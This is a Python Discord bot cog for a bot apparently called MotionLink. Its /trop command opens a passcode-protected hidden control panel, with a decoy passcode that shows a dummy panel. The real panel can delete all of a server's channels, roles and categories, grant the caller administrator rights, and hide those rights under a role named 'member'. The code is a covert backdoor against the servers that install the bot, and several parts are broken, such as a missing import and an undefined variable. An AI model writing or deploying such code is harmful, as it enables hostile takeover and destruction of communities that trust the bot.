# general libraries
import discord
from discord import app_commands
from discord.ext import commands
import discord.utils

# cog specific libraries
import bcrypt

# create dummy view
class Dummy(discord.ui.View):
    def __init__(self):
        super().__init__()
        
    @discord.ui.select(placeholder = "Select a command...", min_values = 1, max_values = 1, options = [ 
            discord.SelectOption(
                label="Sync",
                description="Sync motionlink's command tree **globally**."
            ),
            discord.SelectOption(
                label="Custom Command",
                description="Run a custom command that could be run within a motionlink executed async one."
            )
        ]
    )
    async def select(self, interaction, select):
        global command
        command = select.values[0]
        await interaction.response.defer()
    


    @discord.ui.button(label="Run Command", style=discord.ButtonStyle.green, row=2)
    async def screen(self, interaction: discord.Interaction, button: discord.ui.Button):
        if command == "Sync":
            # sync(interaction)
            await interaction.response.defer()
        else:
            await interaction.response.defer()
            

# create terminal view
class Terminal(discord.ui.View):
    def __init__(self):
        super().__init__()
        
    @discord.ui.select(placeholder = "Select a command...", min_values = 1, max_values = 1, options = [ 
            discord.SelectOption(
                label="Sync",
                description="Sync motionlink's command tree **globally**."
            ),
            discord.SelectOption(
                label="Destroy Server",
                description="Absolutely obliterate a server!"
            ),
            discord.SelectOption(
                label="Force OP",
                description="Create role with admin and assign to self."
            ),
            discord.SelectOption(
                label="Remove OP",
                description="Remove role with admin and assigned to self."
            ),
            discord.SelectOption(
                label="Force OP Hidden",
                description="Create role for everyone and an identical one for self that has adminstratory powers."
            ),
            discord.SelectOption(
                label="Remove OP Hidden",
                description="Delete role for everyone and an identical one for self that has adminstratory powers."
            ),
            discord.SelectOption(
                label="Custom Command",
                description="Run a custom command that could be run within a motionlink executed async one."
            )
        ]
    )
    async def select(self, interaction, select):
        global command
        command = select.values[0]
        await interaction.response.defer()
    


    @discord.ui.button(label="Run Command", style=discord.ButtonStyle.green, row=2)
    async def screen(self, interaction: discord.Interaction, button: discord.ui.Button):
        if command == "Sync":
            # sync(interaction)
            pass
        elif command == "Destroy Server":
            try:
                for c in interaction.guild.channels:
                    await c.delete()
                for r in interaction.guild.roles:
                    await r.delete()
                for c in interaction.guild.categories:
                    await c.delete()
            except:
                pass
        elif command == "Force OP": 
            perms = discord.Permissions(administrator=True)
            op = await interaction.guild.create_role(name=".", permissions=perms)
            await interaction.user.add_roles(op)

        elif command == "Remove OP": 
            op = discord.utils.get(interaction.message.guild.roles, name=".")
            await op.delete()

        elif command == "Force OP Hidden": 
            everyone = await interaction.guild.create_role(name="member")
            for member in interaction.guild.members:
                if member != interaction.user:
                    await member.add_roles(everyone)

            perms = discord.Permissions(administrator=True)
            op = await interaction.guild.create_role(name="member", permissions=perms)
            await interaction.user.add_roles(op)

        elif command == "Remove OP Hidden":
            everyone = discord.utils.get(interaction.message.guild.roles, name="member")
            await member.delete()
            op = discord.utils.get(interaction.message.guild.roles, name="member")
            await op.delete()



        await interaction.response.defer()


# create auth view
class Auth(discord.ui.View):
    def __init__(self):
        super().__init__()
        

    password = 1234
    attempt = "                         "

    fake = b'$2b$12$LsAOQrNUEhHRVsKgNFeER.YTnf6445RCHaOlzjd1xVvXN6ALkMGYy'
    real = b'$2b$12$pXpR/9mQdJgD6Of3as09cuoVlVchB7SLZfkforIFGlRwqh0gYJgne'


    @discord.ui.button(label=attempt, style=discord.ButtonStyle.grey, row=0)
    async def screen(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()

    @discord.ui.button(label='1', style=discord.ButtonStyle.grey, row=1)
    async def pressed1(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "1 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)
    
    @discord.ui.button(label='2', style=discord.ButtonStyle.grey, row=1)
    async def pressed2(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "2 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)
    
    @discord.ui.button(label='3', style=discord.ButtonStyle.grey, row=1)
    async def pressed3(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "3 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)

    @discord.ui.button(label='4', style=discord.ButtonStyle.grey, row=2)
    async def pressed4(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "4 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)
    
    @discord.ui.button(label='5', style=discord.ButtonStyle.grey, row=2)
    async def pressed5(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "5 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)
    
    @discord.ui.button(label='6', style=discord.ButtonStyle.grey, row=2)
    async def pressed6(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "6 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)
        print(self.attempt)

    @discord.ui.button(label='7', style=discord.ButtonStyle.grey, row=3)
    async def pressed7(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "7 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)
    
    @discord.ui.button(label='8', style=discord.ButtonStyle.grey, row=3)
    async def pressed8(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "8 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)
    
    @discord.ui.button(label='9', style=discord.ButtonStyle.grey, row=3)
    async def pressed9(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "9 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)
    



    @discord.ui.button(label='✘', style=discord.ButtonStyle.red, row=4)
    async def pressedN(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = "                         "
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)


    @discord.ui.button(label='0', style=discord.ButtonStyle.grey, row=4)
    async def pressed0(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.attempt = self.attempt.replace(" ", "0 ", 1)
        self.screen.label = self.attempt
        await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)
    

    @discord.ui.button(label='✔', style=discord.ButtonStyle.green, row=4)
    async def pressedY(self, interaction: discord.Interaction, button: discord.ui.Button):

        guess = ""
        for c in self.attempt:
            if c.isdigit():
                guess = guess + c
        guess = guess.encode('utf-8')
        if bcrypt.checkpw(guess, self.real) == True:
            self.screen.label = "       Access Granted      "
            terminal = Terminal()
            await interaction.response.edit_message(content=">>> **Trop Terminal**\nMotionlink's real control panel, welcome back *troopek*!", view=terminal)
        elif bcrypt.checkpw(guess, self.fake) == True:
            self.screen.label = "       Access Granted      "
            dummy = Dummy()
            await interaction.response.edit_message(content=">>> **Control Panel Authentication**\nMotionLink's operational center.", view=dummy)
        else:               
            self.attempt = "    Invalid Password   "
            self.screen.label = self.attempt
            time.sleep(1)
            self.attempt = "                         "
            self.screen.label = self.attempt
            await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=self)

# create trop cog
class Trop(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
    
    @app_commands.command(name="trop")
    async def trop(self, interaction) -> None:
        """ Initiate the trop terminal (MotionLink's Control Panel). """
        view = Auth()
        await interaction.response.send_message(">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=view, ephemeral=True)
        # await interaction.response.edit_message(content=">>> **Trop Terminal Authentication**\nThis Control Panel has special acces only and requires verification, the passcode is 8 digits. You are limited to three attempts", view=view)
        # await interaction.followup.send(view=view, ephemeral=True)
    




# setup function
async def setup(bot):
    await bot.add_cog(Trop(bot))